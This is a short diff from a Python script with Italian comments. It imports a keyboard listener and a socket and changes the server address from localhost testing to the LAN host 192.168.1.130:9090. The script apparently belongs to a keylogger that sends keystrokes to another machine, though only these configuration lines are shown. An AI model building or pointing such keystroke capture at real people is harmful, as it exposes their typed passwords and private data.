@@ -4,8 +4,8 @@ import socket
 from pynput import keyboard
 
 # indirizzo ip e porta del server
-#SERVER_ADDRESS = ("192.168.1.130", 9090)
-SERVER_ADDRESS = ("127.0.0.1", 9090) # Indirizzo di loopback per testare localmente
+SERVER_ADDRESS = ("192.168.1.130", 9090)
+#SERVER_ADDRESS = ("127.0.0.1", 9090) # Indirizzo di loopback per testare localmente
 
 BUFFER_SIZE = 4096
 
